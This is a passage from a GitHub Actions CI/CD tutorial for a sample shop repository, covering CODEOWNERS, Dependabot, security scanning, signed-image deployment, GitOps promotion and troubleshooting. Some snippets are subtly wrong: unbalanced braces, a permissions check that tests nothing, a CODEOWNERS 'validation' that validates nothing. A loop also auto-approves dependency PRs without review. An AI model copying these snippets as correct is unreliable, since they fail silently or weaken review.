  ☑ Include administrators                        ← ⭐⭐ YOU TOO

REPOSITORY Settings → Secrets and variables → Actions
  ⭐ Audit: when was each secret last updated? Rotate anything older than 90 days.
```

### 8.2 CODEOWNERS ⭐

```
# .github/CODEOWNERS
# ⭐ syntax: <pattern> <owner> [@user, @org/team, or an email]
# The LAST matching pattern wins.

# default
*                                @3558Bhk

# ⭐⭐ THE PIPELINE ITSELF — the platform team owns it
/.github/workflows/**            @3558Bhk/platform-team
/.github/actions/**              @3558Bhk/platform-team
/.github/CODEOWNERS              @3558Bhk/platform-team @3558Bhk/security
/.github/dependabot.yml          @3558Bhk/platform-team

# the deployment manifests — an SRE must approve
/helm/**                         @3558Bhk/sre
/k8s/**                          @3558Bhk/sre
/scripts/deploy*.sh              @3558Bhk/sre
/scripts/rollback*.sh            @3558Bhk/sre

# ⭐ per-service ownership
/apps/shop-api/**                @3558Bhk/backend-team
/apps/checkout/**                @3558Bhk/payments-team @3558Bhk/sre
/apps/order-worker/**            @3558Bhk/backend-team
/apps/shop-ui/**                 @3558Bhk/frontend-team
/apps/payment-mock/**            @3558Bhk/payments-team

# ⭐⭐ anything that touches money or secrets needs TWO owners
/apps/checkout/src/**/payment*   @3558Bhk/payments-team @3558Bhk/security
**/*secret*                      @3558Bhk/security
**/*.pem                         @3558Bhk/security
**/*.key                         @3558Bhk/security

# infrastructure
/infra/**                        @3558Bhk/sre
**/*.tf                          @3558Bhk/sre
**/*.bicep                       @3558Bhk/sre
```

```bash
# ⭐ verify your CODEOWNERS is valid — a typo makes it silently do nothing
gh api repos/3558Bhk/shop/contents/.github/CODEOWNERS \
  -H "Accept: application/vnd.github.raw" > /tmp/CODEOWNERS
# a bad entry (a team that doesn't exist, a user without write access) shows up as:
gh api repos/3558Bhk/shop/contents/.github/CODEOWNERS \
  -H "Accept: application/vnd.github.raw+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" 2>&1 | head
# or check in the UI: a file with an invalid CODEOWNERS shows a ⚠️ banner.
# ⭐⭐ the most common silent failure: the team name is wrong, or the user
#    does not have WRITE access to the repo. The rule is ignored, no error shown.
```

### 8.3 Dependabot

```yaml
# .github/dependabot.yml
version: 2
registries:
  ghcr:
    type: docker-registry
    url: ghcr.io
    username: 3558bhk
    password: ${{ secrets.GHCR_TOKEN }}
  maven-shop:
    type: maven-repository
    url: https://maven.pkg.github.com/3558Bhk/shop
    username: 3558bhk
    password: ${{ secrets.GHCR_TOKEN }}

updates:
  # ⭐ GitHub Actions themselves — the most-forgotten ecosystem
  - package-ecosystem: github-actions
    directory: /
    schedule: {interval: weekly, day: monday, time: '04:00', timezone: Asia/Kolkata}
    open-pull-requests-limit: 10
    groups:
      actions-minor:
        update-types: [minor, patch]
    labels: [dependencies, ci]
    commit-message: {prefix: 'ci'}
    reviewers: ['3558Bhk/platform-team']

  - package-ecosystem: docker
    directory: /apps/shop-api
    schedule: {interval: weekly}
    ignore:
      - dependency-name: 'eclipse-temurin'
        versions: ['22', '23']         # ⭐ stay on the LTS
    groups:
      docker-base: {patterns: ['*']}

  - package-ecosystem: docker
    directory: /apps/checkout

  - package-ecosystem: maven
    directory: /apps/shop-api
    registries: [maven-shop]
    schedule: {interval: weekly}
    groups:
      spring: {patterns: ['org.springframework*']}
      test:   {patterns: ['*test*', 'junit*', 'mockito*', 'assertj*']}
    ignore:
      - dependency-name: 'org.springframework.boot:spring-boot-starter-parent'
        update-types: [version-update:semver-major]     # ⭐ majors need a human

  - package-ecosystem: gomod
    directory: /apps/checkout
    schedule: {interval: weekly}
    groups: {go: {patterns: ['*']}}

  - package-ecosystem: npm
    directory: /apps/shop-ui
    schedule: {interval: weekly}
    versioning-strategy: increase-if-necessary
    groups:
      eslint:  {patterns: ['eslint*', '*eslint*']}
      vitest:  {patterns: ['vitest*', '*testing-library*']}
      all-minor: {update-types: [minor, patch]}

  - package-ecosystem: pip
    directory: /apps/order-worker
    schedule: {interval: weekly}
    groups: {python: {patterns: ['*']}}

  # ⭐ the IaC and the Helm charts
  - package-ecosystem: terraform
    directory: /infra
    schedule: {interval: weekly}
  - package-ecosystem: 'gitsubmodule'
    directory: /
    schedule: {interval: weekly}
```

```bash
gh api repos/3558Bhk/shop/dependabot/secrets --jq '.secrets[].name'
gh api repos/3558Bhk/shop/dependabot/alerts --jq '[.[] | select(.state=="open")] |
  group_by(.dependency.package.ecosystem) | map({ecosystem: .[0].dependency.package.ecosystem, count: length})'
# ⭐ auto-merge Dependabot PRs that only bump a patch version
gh pr list --author app/dependabot --json number,title --jq '.[] | select(.title|test("bump .* from .* to .*\\.[0-9]+$")) | .number' \
  | while read n; do gh pr review $n --approve --body "patch bump, auto-approved"; gh pr merge $n --squash --auto; done
```

### 8.4 Code scanning

```yaml
# .github/workflows/security.yml
name: Security
on:
  push: {branches: [main]}
  pull_request: {branches: [main]}
  schedule: [{cron: '0 3 * * 1'}]              # ⭐ weekly deep scan

permissions:
  contents: read
  security-events: write                        # ⭐⭐ REQUIRED to upload SARIF
  actions: read

jobs:
  codeql:
    name: 🔬 CodeQL (${{ matrix.language }})
    runs-on: ubuntu-latest
    timeout-minutes: 30
    strategy:
      fail-fast: false
      matrix:
        include:
          - {language: java-kotlin,   build-mode: manual}
          - {language: javascript-typescript, build-mode: none}
          - {language: python,        build-mode: none}
          - {language: go,            build-mode: autobuild}
    steps:
      - uses: actions/checkout@v7
      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          build-mode: ${{ matrix.build-mode }}
          queries: security-and-quality         # ⭐ the deeper query suite
          config: |
            paths-ignore:
              - '**/*_test.go'
              - '**/test/**'
              - '**/node_modules/**'
      - if: matrix.build-mode == 'manual'
        run: |
          cd apps/shop-api && ./mvnw -B -DskipTests package
      - uses: github/codeql-action/analyze@v3
        with:
          category: '/language:${{ matrix.language }}'
          upload: true                          # ⭐ `true` = upload to code scanning
          max-result-size: 10mb

  trivy:
    name: 🛡️ Trivy (fs + config + image)
    runs-on: ubuntu-latest
    permissions: {contents: read, security-events: write}
    steps:
      - uses: actions/checkout@v7
      - name: Filesystem and IaC scan
        uses: aquasecurity/trivy-action@0.28.0
        with:
          scan-type: fs
          scan-ref: .
          scanners: vuln,secret,misconfig,license
          severity: CRITICAL,HIGH,MEDIUM
          exit-code: '1'
          ignore-unfixed: true
          format: sarif
          output: trivy-fs.sarif
          trivyignores: .trivyignore
        continue-on-error: false
      - name: Upload the SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: trivy-fs.sarif
          category: trivy-fs
      - name: Also produce a readable table for the summary
        if: always()
        uses: aquasecurity/trivy-action@0.28.0
        with:
          scan-type: fs
          scan-ref: .
          format: table
          output: trivy-fs.txt
      - run: |
          { echo '## 🛡️ Trivy'; echo; echo '```'; cat trivy-fs.txt | head -80; echo '```'; } \
            >> "$GITHUB_STEP_SUMMARY"

  semgrep:
    name: 🧠 Semgrep
    runs-on: ubuntu-latest
    permissions: {contents: read, security-events: write}
    steps:
      - uses: actions/checkout@v7
        with: {fetch-depth: 0}                  # ⭐ needed for diff-aware scanning
      - uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/security-audit
            p/golang
            p/java
            p/python
          generateSarif: 1
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with: {sarif_file: semgrep.sarif, category: semgrep}

  # ⭐⭐ THE WORKFLOW-SECURITY SCAN — scan your own pipelines
  actionlint:
    name: 🔍 actionlint
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: rhysd/actionlint@v1.7.7
        with: {shellcheck: true, pyflakes: true}
      # ⭐ and zizmor — the Actions-specific security linter
      - uses: zizmorcore/zizmor-action@v0.1.0
        with: {persona: pedantic, format: sarif, offline: true}
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with: {sarif_file: results.sarif, category: zizmor}
```

```bash
# read the alerts
gh api repos/3558Bhk/shop/code-scanning/alerts --jq '[.[] | select(.state=="open")] |
  group_by(.rule.severity) | map({severity: .[0].rule.severity, count: length})'
gh api repos/3558Bhk/shop/code-scanning/alerts/42 --jq '{rule: .rule.id, severity: .rule.security_severity_level, location: .most_recent_instance.location.path, line: .most_recent_instance.location.start_line}'
# ⭐ dismiss an alert with a reason (this is audited)
gh api repos/3558Bhk/shop/code-scanning/alerts/42/dismissals -X POST \
  -f message='false positive: the input is validated at line 12' \
  -f reason='false positive'
# reasons: 'false positive' | 'won't fix' | 'used in tests'
```

---

## 9 · Deploying

### 9.1 The CD workflow

```yaml
# .github/workflows/cd.yml
name: CD

on:
  workflow_run:
    workflows: ['CI']
    types: [completed]
    branches: [main]
  workflow_dispatch:
    inputs:
      environment: {type: environment, required: true, default: dev}   # ⭐⭐ a dropdown of
      revision:    {type: string,  required: false}                    #    your environments!
      dry-run:     {type: boolean, default: false}

permissions:
  contents: read
  deployments: write          # ⭐ for the Deployments API history
  id-token: write

concurrency:
  group: deploy-${{ github.event.inputs.environment || 'dev' }}
  cancel-in-progress: false    # ⭐⭐ QUEUE, never cancel a deploy

env:
  REGISTRY: ghcr.io
  NAMESPACE: shop

jobs:
  # ══════════════════════════════════════════════════════════════
  gate:
    name: 🚦 Should we deploy?
    runs-on: ubuntu-latest
    if: |
      (github.event_name == 'workflow_dispatch') ||
      (github.event_name == 'workflow_run' && github.event.workflow_run.conclusion == 'success')
    outputs:
      revision: ${{ steps.resolve.outputs.revision }}
      services: ${{ steps.resolve.outputs.services }}
    steps:
      - name: Resolve the revision to deploy
        id: resolve
        run: |
          set -euo pipefail
          if [[ -n "${{ github.event.inputs.revision }}" ]]; then
            REV="${{ github.event.inputs.revision }}"
          else
            REV="${{ github.event.workflow_run.head_sha }}"
          fi
          echo "revision=$REV" >> "$GITHUB_OUTPUT"
          echo "  deploying revision ${REV:0:7}"
          # ⭐⭐ and PROVE that this revision passed CI
          CONCLUSION=$(gh api "repos/$GITHUB_REPOSITORY/commits/$REV/check-runs" \
            --jq '[.check_runs[] | select(.name|startswith("CI"))] | .[0].conclusion')
          if [[ "$CONCLUSION" != "success" ]]; then
            echo "::error::revision ${REV:0:7} did not pass CI (conclusion: $CONCLUSION)"
            exit 1
          fi
          echo "  ✅ CI passed for $REV"
        env: {GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  # ══════════════════════════════════════════════════════════════
  deploy:
    name: 🚀 ${{ github.event.inputs.environment || 'dev' }}
    needs: gate
    runs-on: ubuntu-latest
    timeout-minutes: 30
    environment:
      name: ${{ github.event.inputs.environment || 'dev' }}
      url: ${{ vars.ENVIRONMENT_URL }}              # ⭐ shown as a link in the UI
    concurrency:
      group: deploy-${{ github.event.inputs.environment || 'dev' }}
      cancel-in-progress: false
    steps:
      - uses: actions/checkout@v7

      # ⭐ 1. download the ARTIFACT from the CI run — not rebuild it
      - name: Download the built metadata
        uses: actions/download-artifact@v4
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          run-id: ${{ github.event.workflow_run.id }}
          pattern: image-info-*
          path: image-info
          merge-multiple: true

      # ⭐ 2. VERIFY the signature before deploying — fail closed
      - name: Verify every image
        run: |
          set -euo pipefail
          fail=0
          for f in image-info/*.json; do
            svc=$(jq -r .service "$f"); img=$(jq -r .image "$f"); dig=$(jq -r .digest "$f")
            echo "==> $svc: $img@$dig"
            if cosign verify "$img@$dig" \
                 --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
                 --certificate-identity-regexp="^https://github.com/$GITHUB_REPOSITORY/.github/workflows/ci.yml@refs/heads/main$" \
                 >/dev/null 2>&1; then
              echo "  ✅ signed by this repo's CI on main"
            else
              echo "  ⛔ NOT signed, or signed by something else"; fail=1
            fi
            # ⭐ and the SBOM gate
            trivy image --severity CRITICAL --quiet --exit-code 1 --ignore-unfixed "$img@$dig" \
              || { echo "  ⛔ CRITICAL vulnerabilities"; fail=1; }
          done
          (( fail == 0 )) || { echo "::error::image verification failed"; exit 1; }

      # ⭐ 3. authenticate to the cluster via OIDC
      - uses: azure/login@v2
        if: vars.CLOUD == 'azure'
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
      - run: az aks get-credentials -g rg-shop -n ${{ vars.CLUSTER_NAME }} --overwrite-existing
        if: vars.CLOUD == 'azure'

      - uses: aws-actions/configure-aws-credentials@v5
        if: vars.CLOUD == 'aws'
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: aws eks update-kubeconfig --name ${{ vars.CLUSTER_NAME }}
        if: vars.CLOUD == 'aws'

      # ⭐ (for the local kind cluster — the learning setup)
      - name: Set up kind
        if: vars.CLOUD == 'kind'
        run: |
          curl -Lo ./kind "https://kind.sigs.k8s.io/dl/${KIND_VERSION}/kind-linux-amd64" && chmod +x ./kind && sudo mv ./kind /usr/local/bin
          kind get clusters | grep -q cicd || kind create cluster --config ci/kind.yaml --name cicd
          kubectl cluster-info --context kind-cicd

      # ⭐ 4. the production gate (SLO-aware — see the Azure DevOps case for the script)
      - name: 🛡️ The production gate
        if: (github.event.inputs.environment || 'dev') == 'production'
        run: ./scripts/production-gate.sh
        env:
          PROMETHEUS: ${{ vars.PROMETHEUS_URL }}
          ALERTMANAGER: ${{ vars.ALERTMANAGER_URL }}

      # ⭐ 5. deploy
      - name: Deploy
        run: |
          set -euo pipefail
          ENV="${{ github.event.inputs.environment || 'dev' }}"
          DRY_RUN="${{ github.event.inputs.dry-run || 'false' }}" \
          DEPLOYED_BY="github-actions/$GITHUB_RUN_ID" \
          BUILD_URL="$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" \
            ./scripts/deploy.sh "$ENV" "${{ needs.gate.outputs.revision }}"
        env:
          IMAGE_INFO_DIR: image-info

      # ⭐ 6. record the deployment in the Deployments API
      - name: Record the deployment
        if: always()
        run: |
          set -euo pipefail
          ENV="${{ github.event.inputs.environment || 'dev' }}"
          STATE=$([[ "$GITHUB_JOB_STATUS" == "success" || "${{ job.status }}" == "success" ]] && echo success || echo failure)
          DEP_ID=$(gh api "repos/$GITHUB_REPOSITORY/deployments" -X POST \
            -f ref="${{ needs.gate.outputs.revision }}" -f environment="$ENV" \
            -f task=deploy -f 'auto_merge=false' \
            -f "payload[run]=$GITHUB_RUN_ID" -f "payload[actor]=$GITHUB_ACTOR" --jq .id)
          gh api "repos/$GITHUB_REPOSITORY/deployments/$DEP_ID/statuses" -X POST \
            -f state="$STATE" -f description="GitHub Actions run $GITHUB_RUN_ID" \
            -f environment_url="${{ vars.ENVIRONMENT_URL }}" \
            -f log_url="$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
        env: {GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # ⭐ 7. notify
      - uses: ./.github/actions/notify-slack
        if: always()
        with:
          webhook: ${{ secrets.SLACK_WEBHOOK }}
          status: ${{ job.status }}
          environment: ${{ github.event.inputs.environment || 'dev' }}
          revision: ${{ needs.gate.outputs.revision }}
```

```yaml
# .github/actions/notify-slack/action.yml — ⭐ a composite action
name: Notify Slack
inputs:
  webhook:     {required: true}
  status:      {required: true}
  environment: {required: true}
  revision:    {required: true}
runs:
  using: composite
  steps:
    - name: Post
      shell: bash
      env: {WEBHOOK: ${{ inputs.webhook }}}
      run: |
        set -euo pipefail
        case "${{ inputs.status }}" in
          success) EMOJI="✅"; COLOR="good";;
          failure) EMOJI="⛔"; COLOR="danger";;
          cancelled) EMOJI="🚫"; COLOR="warning";;
          *) EMOJI="❓"; COLOR="#808080";;
        esac
        jq -n --arg t "$EMOJI ${{ inputs.environment }} deploy ${{ inputs.status }}" \
              --arg c "$COLOR" \
              --arg rev "${{ inputs.revision }}" \
              --arg url "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" \
              --arg by "$GITHUB_ACTOR" \
          '{attachments:[{color:$c, title:$t, title_link:$url, fields:[
             {title:"Revision", value:($rev[0:7]), short:true},
             {title:"Triggered by", value:$by, short:true}]}]}' \
          | curl -sS -XPOST -H 'Content-Type: application/json' -d @- "$WEBHOOK"
```

### 9.2 The GitOps hand-off ⭐⭐ (the production pattern)

```yaml
# ⭐ CI pushes to a SEPARATE config repo; Argo CD reconciles.
# The app pipeline NEVER talks to the cluster. That's the whole point.
  update-config:
    name: 🔀 Update the GitOps config repo
    needs: [build, deploy-staging]
    runs-on: ubuntu-latest
    permissions:
      contents: read
      # ⭐⭐ NOTHING that touches a cluster. Only a token for the config repo.
    steps:
      - uses: actions/checkout@v7
        with:
          repository: 3558Bhk/shop-config         # ⭐ a DIFFERENT repository
          token: ${{ secrets.SHOP_CONFIG_TOKEN }} # ⭐⭐ a narrowly-scoped PAT or
          path: shop-config                       #    a GitHub App installation token
          # ⭐⭐ BETTER: a GitHub App, so the credential is per-repo and rotatable

      - name: Write the digest
        run: |
          set -euo pipefail
          cd shop-config
          for f in image-info/*.json; do
            svc=$(jq -r .service "$f"); dig=$(jq -r .digest "$f")
            ENV="${{ github.event.inputs.environment || 'staging' }}"
            FILE="environments/$ENV/values-$ENV.yaml"
            # ⭐ yq, not sed — structured edits
            yq -i ".\"$svc\".image.digest = \"$dig\"" "$FILE"
            yq -i ".\"$svc\".image.revision = \"$GITHUB_SHA\"" "$FILE"
            echo "  $svc → ${dig:0:19}… in $FILE"
          done
          # ⭐ record the deploy intent for the audit trail
          jq -n --arg sha "$GITHUB_SHA" --arg run "$GITHUB_RUN_ID" \
                --arg env "${{ github.event.inputs.environment || 'staging' }}" \
                --arg by "$GITHUB_ACTOR" \
            '{revision:$sha, run:$run, environment:$env, by:$by, at:(now|todate)}' \
            > "environments/${{ github.event.inputs.environment || 'staging' }}/last-promoted.json"

      - name: Open a PR (or commit straight through)
        run: |
          set -euo pipefail
          cd shop-config
          git config user.name  "shop-ci[bot]"
          git config user.email "shop-ci@users.noreply.github.com"
          BR="promote/${{ github.event.inputs.environment || 'staging' }}-${GITHUB_SHA:0:7}"
          git checkout -b "$BR"
          git add -A
          if git diff --cached --quiet; then
            echo "  nothing changed — the digests are already current"
            exit 0
          fi
          git commit -m "chore(promote): ${{ github.event.inputs.environment || 'staging' }} → ${GITHUB_SHA:0:7}

          Promoted by GitHub Actions run $GITHUB_RUN_ID
          Triggered by $GITHUB_ACTOR

          Images promoted by DIGEST, so this is reproducible and immutable.
          Argo CD will reconcile within 3 minutes (or immediately with the webhook)."
          git push -u origin "$BR"
          gh pr create --title "chore(promote): ${{ github.event.inputs.environment || 'staging' }} → ${GITHUB_SHA:0:7}" \
            --body-file <(git log -1 --pretty=%B) \
            --label automated,promotion \
            --reviewer sre-lead \
            --base main
        env:
          GH_TOKEN: ${{ secrets.SHOP_CONFIG_TOKEN }}

      # ⭐⭐ and for production, where a PR + human approval IS the gate:
      #   the merge of that PR triggers Argo CD. No cluster credential in CI at all.
```

### 9.3 Argo CD / Argo Rollouts from a workflow

```yaml
      - name: Wait for Argo CD to sync
        run: |
          set -euo pipefail
          for i in $(seq 1 40); do
            STATUS=$(argocd app get shop --refresh -o json | jq -r '.status.sync.status')
            HEALTH=$(argocd app get shop -o json | jq -r '.status.health.status')
            echo "  [$i/40] sync=$STATUS health=$HEALTH"
            [[ "$STATUS" == "Synced" && "$HEALTH" == "Healthy" ]] && exit 0
            [[ "$HEALTH" == "Degraded" ]] && { echo "::error::the app is Degraded"; exit 1; }
            sleep 15
          done
          echo "::error::Argo CD did not converge in 10 minutes"
          argocd app get shop -o json | jq '.status.conditions'
          exit 1

      - name: Progressive delivery with Argo Rollouts
        run: |
          set -euo pipefail
          # the Rollout resource drives the canary; CI only observes
          for i in $(seq 1 60); do
            PHASE=$(kubectl -n shop get rollout shop-api -o jsonpath='{.status.phase}')
            STEP=$(kubectl -n shop get rollout shop-api -o jsonpath='{.status.currentStepIndex}')
            echo "  phase=$PHASE step=$STEP"
            case "$PHASE" in
              Healthy) echo "  ✅ promoted"; exit 0 ;;
              Degraded|Aborted) echo "  ⛔ $PHASE"; kubectl -n shop argo rollouts get shop-api; exit 1 ;;
              Paused)
                # ⭐ the analysis is automatic — but you can gate on CI's own metrics
                ./scripts/analyse-canary.sh production || {
                  echo "  ⛔ the CI-side analysis failed — aborting"
                  kubectl -n shop argo rollouts abort shop-api; exit 1; }
                ;;
            esac
            sleep 20
          done
```

---

## 10 · Troubleshooting — the failures that actually happen

### 10.1 The workflow doesn't trigger

| Symptom | Cause | Fix |
|---|---|---|
| Nothing happens on push | The file isn't on the **default branch** yet | ⭐ `on.push` is read from the pushed branch, but `on.schedule` and `on.workflow_dispatch` are read from the **default branch only**. Merge it to main. |
| Nothing happens on a PR | `on.pull_request` is missing, or `types:` excludes `synchronize` | Add `types: [opened, synchronize, reopened]` |
| Nothing on a tag push | `tags:` isn't under `push:` | `on: push: tags: ['v*.*.*']` |
| A path filter ate it | `paths:` excluded the changed file | ⛔ `paths` and `paths-ignore` **cannot be combined** on the same event — the second is ignored |
| The schedule never runs | ⭐ The repo has been inactive 60 days, OR the cron is wrong, OR GitHub is behind | Check the cron (UTC!), push a commit, wait up to an hour |
| `workflow_dispatch` has no button | The workflow isn't on the default branch | Merge to main |
| ⛔ "Resource not accessible by integration" | `permissions:` is too narrow | Add the specific permission the step needs |
| ⛔ "GitHub Actions is not enabled" | Organization/repo setting | Settings → Actions → General → enable |

### 10.2 Permissions errors

```
⛔ "Error: Resource not accessible by integration"
   ⛔ "denied: requested access to the resource is denied"   (GHCR)
   ⛔ "403 Forbidden" from the GitHub API
   ⛔ "ACTIONS_ID_TOKEN_REQUEST_TOKEN is not set"

# ⭐ the diagnostic — print what you actually have
- run: |
    echo "=== the token's scopes ==="
    curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" -I \
      https://api.github.com/repos/$GITHUB_REPOSITORY | grep -i 'x-oauth-scopes\|x-accepted'
    echo "=== can I do X? ==="
    for perm in contents packages deployments issues pull-requests actions id-token security-events; do
      code=$(curl -sS -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $GITHUB_TOKEN" \
        https://api.github.com/repos/$GITHUB_REPOSITORY)
      printf '  %-18s HTTP %s\n' "$perm" "$code"
    done
    echo "=== workflow-level permissions ==="
    gh api "repos/$GITHUB_REPOSITORY/actions/permissions/workflow" \
      --jq '{default: .default_workflow_permissions, approvePRs: .can_approve_pull_requests}'
  env: {GITHUB_TOKEN: '${{ secrets.GITHUB_TOKEN }}', GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}'}

# the five causes, in order of frequency:
# 1. `permissions:` is missing → the default applies. Org default = read.
#    FIX: add `permissions:` at the workflow or job level.
# 2. the ORG default is "read" and you need "write" for ONE step.
#    FIX: set it on the JOB, not the workflow — least privilege.
# 3. ⭐ a FORK PR. GITHUB_TOKEN is read-only for pull_request from a fork, ALWAYS.
#    FIX: you cannot change this. Use the workflow_run pattern (§1.2) or
#         a different secret (and understand the risk).
# 4. GHCR: the package isn't linked to the repo with WRITE.
#    FIX: Package Settings → Manage Actions access → add the repo with Write.
# 5. `id-token: write` is missing → OIDC fails.
```

### 10.3 The job hangs, or runs out of time/memory/disk

```yaml
# ⭐ the three resource failures
# 1. TIMEOUT — the default is 360 minutes! Set it.
timeout-minutes: 30
# ⛔ "The job was not started because recent account payments have failed or your
#     spending limit needs to be increased"
# ⛔ "The runner has received a shutdown signal" — hit the 6-hour hard cap

# 2. OUT OF MEMORY (7 GB on ubuntu-latest)
- run: |
    free -h
    # ⭐ reduce the JVM heap for a Maven build
    export MAVEN_OPTS="-Xmx2g -XX:MaxMetaspaceSize=512m"
    # ⭐ don't run Testcontainers with 5 containers AND a JVM AND a build
    # ⭐ a larger runner is sometimes the honest answer
# ⛔ "Java heap space", "Killed" (exit 137), "The runner has stopped responding"

# 3. OUT OF DISK (14 GB)
- run: |
    df -h /
    # ⭐⭐ free ~10 GB in 20 seconds:
    sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc /opt/hostedtoolcache/CodeQL
    docker system prune -af --volumes
    sudo apt-get clean
    df -h /
  # ⭐ put this early in the job for a big Docker build
```

```bash
# ⭐ a step that hangs forever
# the classic cause: a background process still holds the stdout pipe open.
- run: |
    ./scripts/start-server.sh &        # ⛔ the step waits for the PIPE to close
    sleep 10
# ✅ FIX:
- run: |
    nohup ./scripts/start-server.sh > server.log 2>&1 &
    disown
    sleep 10
    curl --retry 10 --retry-connrefused --retry-delay 5 http://localhost:8080/actuator/health
# ✅ OR use a `services:` container
# ✅ OR set a step-level timeout:
  timeout-minutes: 3
```

### 10.4 The cache misses

```bash
# ⭐ diagnose
- uses: actions/cache@v4
  id: c
  with: {path: ~/.m2/repository, key: '${{ runner.os }}-maven-${{ hashFiles(''**/pom.xml'') }}'}
- run: echo "cache hit = ${{ steps.c.outputs.cache-hit }}"     # 'true' | 'false'

# the six causes:
# 1. ⭐ the key contains something that changes every run (a timestamp, the SHA)
# 2. hashFiles() returned '' because the glob matched nothing — check the pattern
# 3. the cache was created on a DIFFERENT branch — ⭐⭐ caches are branch-scoped:
#    a cache created on `main` is available to PRs FROM main's base, but a cache
#    created on `feature/x` is NOT available to `main`. Only the reverse works.
# 4. the 10 GB per-repo limit was hit — the oldest caches were evicted
# 5. a cache is only saved when the job SUCCEEDS (unless save-always: true)
# 6. restore-keys didn't match a prefix either

# ⭐ inspect
gh api repos/3558Bhk/shop/actions/caches --jq '.actions_caches[] | {key, ref, size_in_bytes, last_accessed_at, created_at}'
gh api repos/3558Bhk/shop/actions/cache/usage-by-repository 2>/dev/null || \
gh api repos/3558Bhk/shop/actions/cache/usage --jq '{count, size_in_bytes}'
gh api repos/3558Bhk/shop/actions/caches -X DELETE         # ⭐ clear everything
```

### 10.5 Docker-in-Docker

```
⭐ GOOD NEWS: the GitHub-hosted ubuntu runner HAS Docker and BuildKit pre-installed.
   `docker build`, `docker buildx build`, `docker compose` all work out of the box.
   No DinD service container needed. This is a real advantage over Jenkins agents.

⛔ "Cannot connect to the Docker daemon at unix:///var/run/docker.sock"
   → you're on a SELF-HOSTED runner where the service user isn't in the docker group
   FIX: sudo usermod -aG docker $USER && sudo systemctl restart actions.runner.*

⛔ "permission denied" inside a `container:` job
   → the job container's user isn't root and the socket is root-owned
   FIX: options: --user root   (and accept the risk), or don't use `container:`

⛔ buildx `--cache-to type=gha` fails silently
   → `docker/setup-buildx-action` wasn't run, so the docker-container driver
     (which supports cache export) isn't in use. The default `docker` driver
     CANNOT export cache.
   FIX: always `uses: docker/setup-buildx-action@v3` before build-push-action.

⛔ multi-platform builds are extremely slow
   → QEMU emulation. For linux/arm64 on an amd64 runner, expect 5–20× slower.
   FIX: use native arm64 runners (ubuntu-24.04-arm), or build each platform
        separately and merge the manifests with `docker buildx imagetools create`.
```

### 10.6 The matrix and `needs` surprises

```yaml
# ⛔ "Job 'x' depends on 'y' but 'y' was skipped"
#    → a job that `needs` a SKIPPED job is itself skipped, unless you say otherwise
- if: always() && (needs.a.result == 'success' || needs.a.result == 'skipped')

# ⛔ a matrix job where ONE combination fails kills the others
strategy:
  fail-fast: false          # ⭐⭐ THE FIX. Default is true.

# ⛔ `needs.<job>.outputs.x` is empty
#    → the producing step needs an `id:`, AND the job needs an `outputs:` block
#    → AND if the job was skipped, the output is ''
jobs:
  a:
    outputs: {v: ${{ steps.s.outputs.v }}}      # ⭐ all three are required
    steps: [{id: s, run: 'echo "v=1" >> "$GITHUB_OUTPUT"'}]
  b:
    needs: a
    steps: [{run: 'echo "${{ needs.a.outputs.v }}"'}]

# ⛔ a dynamic matrix produces zero jobs and the workflow "succeeds" without building
jobs:
  build:
    needs: plan
    if: needs.plan.outputs.count != '0'          # ⭐⭐ fail loudly instead
    strategy: {matrix: {service: '${{ fromJSON(needs.plan.outputs.services) }}'}}
    steps:
      - run: |
          if [[ "${{ strategy.job-total }}" == "0" ]]; then
            echo "::error::the matrix is empty — nothing would be built"
            exit 1
          fi
```

### 10.7 Reading logs efficiently ⭐

```bash
# ⭐⭐ the single most useful command in this whole case
gh run view $RUN_ID --log-failed          # only the failed steps' logs

gh run view $RUN_ID --job $JOB_ID --log | grep -A30 -B10 'ERROR'
gh run list --workflow ci.yml --status failure --limit 10 \
  --json databaseId,displayTitle,createdAt,headBranch \
  | jq -r '.[] | "\(.databaseId)  \(.headBranch)  \(.displayTitle)"'

# ⭐ enable DEBUG LOGGING for one run without editing the YAML
gh api repos/3558Bhk/shop/actions/runs/$RUN_ID/rerun -X POST  # after setting:
gh secret set ACTIONS_RUNNER_DEBUG --body true
gh secret set ACTIONS_STEP_DEBUG --body true
# → then re-run. Step debug logging prints every command and its output.

# ⭐ download the whole log as a zip and grep it offline
gh api repos/3558Bhk/shop/actions/runs/$RUN_ID/logs > run.zip
unzip -o run.zip -d run-logs && grep -rn 'denied\|forbidden\|403\|OOM\|Killed' run-logs/

# ⭐ the timeline — which step was slow?
gh run view $RUN_ID --json jobs --jq '.jobs[] | {name, startedAt, completedAt,
  steps: [.steps[] | {name, conclusion,
    duration: ((.completedAt|fromdate) - (.startedAt|fromdate))}]}' \
  | jq -r '.. | objects | select(.duration?) | "\(.duration)s\t\(.name)"' | sort -rn | head -20

# ⭐ the cost of a run (minutes per job)
gh api repos/3558Bhk/shop/actions/runs --jq '[.workflow_runs[:30][] |
  {name, conclusion, ms: .run_started_at, updated: .updated_at}]'
gh api repos/3558Bhk/shop/actions/billing/usage 2>/dev/null || \
  echo "  → Settings → Billing → Actions → the per-workflow minute breakdown"
```

---

## 11 · The production checklist

```
REPOSITORY
  □ private, or public only if you mean it
